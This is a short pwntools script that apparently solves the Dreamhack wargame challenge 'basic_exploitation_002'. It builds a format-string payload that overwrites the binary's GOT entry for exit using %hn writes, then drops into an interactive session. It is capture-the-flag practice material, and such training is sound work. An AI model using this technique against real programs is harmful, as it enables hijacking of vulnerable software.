#!/usr/bin/env python2

from pwn import *

context.log_level = "debug"
context.update(arch="i386", os="linux")

HOST = "host1.dreamhack.games"
PORT = 19336

e = ELF("./basic_exploitation_002")
proc = process([e.path, e.path])
#proc = remote(HOST, PORT)

payload = asm("nop") * 4
payload += p32(e.got["exit"]) 
payload += p32(e.got["exit"]+2)
payload += "%"+str(0x0804-0xc)+"c"
payload += "%3$hn"
payload += "%"+str(0x8609-0x0804)+"c"
payload += "%2$hn"
proc.sendline(payload)

proc.interactive()
